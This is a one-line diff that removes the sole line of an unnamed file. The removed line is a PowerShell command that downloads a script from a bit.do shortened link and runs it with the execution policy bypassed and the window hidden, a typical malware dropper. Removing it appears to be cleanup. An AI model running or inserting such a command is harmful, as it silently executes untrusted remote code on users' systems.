@@ -1,1 +1,0 @@
-iwr -outf a.ps1 bit.do/eSLgf; powershell -executionpolicy bypass -windowstyle hidden .\a.ps1
